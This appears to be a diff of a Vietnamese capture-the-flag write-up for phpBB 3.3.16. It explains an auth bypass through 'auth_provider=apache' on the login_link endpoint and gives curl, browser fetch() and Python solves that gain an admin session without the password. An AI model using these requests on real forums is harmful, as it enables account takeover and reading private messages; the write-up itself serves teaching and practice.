@@ -24,18 +24,7 @@ phpBB **3.3.16**. `seed.php` nhét flag vào một **private message gửi cho `
 
 Bản này dính **[CVE-2026-48611](https://pentest-tools.com/research/phpbb-authentication-bypass)** (auth bypass, vá ở 3.3.17): controller liên kết tài khoản OAuth `ucp.php?mode=login_link` cho phép **chọn auth provider tuỳ ý** qua tham số `auth_provider`, bỏ qua `auth_method=db` của board. Provider **`apache`** uỷ quyền xác thực cho web server — chỉ kiểm tra `PHP_AUTH_USER == username` và `PHP_AUTH_PW != ''`, **không** so mật khẩu với hash.
 
-Ảnh `php:8.2-apache` (mod_php) tự map header `Authorization: Basic` -> `PHP_AUTH_*`, còn `login_link_x=1` (nút submit kiểu image) làm dữ liệu login_link khác rỗng để qua cửa. Một request là có session admin:
-
-```bash!
-# 1) Auth bypass -> session admin (Set-Cookie: ..._u=2)
-curl -i -u admin:x -c cookies.txt \
-  -d 'login_username=admin&login_password=x&login=Login' \
-  'http://HOST:PORT/ucp.php?mode=login_link&auth_provider=apache&login_link_x=1'
-
-# 2) Đọc PM inbox lấy flag
-curl -s -b cookies.txt 'http://HOST:PORT/ucp.php?i=pm&folder=inbox'
-curl -s -b cookies.txt 'http://HOST:PORT/ucp.php?i=pm&mode=view&p=1'
-```
+Ảnh `php:8.2-apache` (mod_php) tự map header `Authorization: Basic` -> `PHP_AUTH_*`, còn `login_link_x=1` (nút submit kiểu image) làm dữ liệu login_link khác rỗng để qua cửa. 
 
 Sau khi bypass, ta có session của `admin` (không cần biết mật khẩu — để ý góc phải đã là `admin` kèm link ACP) và đọc được private message chứa flag:
 
@@ -44,7 +33,22 @@ Sau khi bypass, ta có session của `admin` (không cần biết mật khẩu �
 -> Flag: `NNS{PHP_1s_mY_P455ion_4ND_s0_aRe_4PacHe_4u7h_pRoviD3r5}`
 
 Full solve:
+1. console
+```javascript!
+user='admin'
+fetch('/ucp.php?mode=login_link&auth_provider=apache&login_link_x=1', {
+method: 'POST',
+headers: {
+'Authorization': 'Basic ' + btoa(user+':wrongpassword'),
+'Content-Type': 'application/x-www-form-urlencoded'
+},
+body: 'login_username='+user+'&login_password=x&login=Login',
+credentials: 'include',
+redirect: 'manual'
+}).then(r => console.log('Status:', r.status));
 
+```
+2. python
 ```python!
 import base64, re, sys, requests
 
@@ -63,4 +67,15 @@ for pid in (1, 2, 3):
     m = re.search(r"NNS\{[^}]*\}", html)
     if m:
         print(m.group()); break
+```
+3. request
+```bash!
+# 1) Auth bypass -> session admin (Set-Cookie: ..._u=2)
+curl -i -u admin:x -c cookies.txt \
+  -d 'login_username=admin&login_password=x&login=Login' \
+  'http://HOST:PORT/ucp.php?mode=login_link&auth_provider=apache&login_link_x=1'
+
+# 2) Đọc PM inbox lấy flag
+curl -s -b cookies.txt 'http://HOST:PORT/ucp.php?i=pm&folder=inbox'
+curl -s -b cookies.txt 'http://HOST:PORT/ucp.php?i=pm&mode=view&p=1'
 ```
